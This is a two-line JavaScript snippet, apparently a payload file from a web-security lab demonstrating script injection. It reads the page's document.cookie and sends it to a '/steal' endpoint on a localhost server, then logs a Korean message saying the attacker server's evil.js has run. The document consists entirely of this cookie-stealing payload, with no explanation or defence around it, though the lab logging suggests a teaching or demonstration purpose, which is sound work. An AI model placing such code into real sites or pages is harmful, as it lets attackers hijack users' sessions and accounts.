fetch(`http://localhost:4000/steal?via=evil.js&c=${encodeURIComponent(document.cookie)}`, { mode: "no-cors" });
window.lab?.log("pwn", "공격자 서버의 evil.js 실행됨");
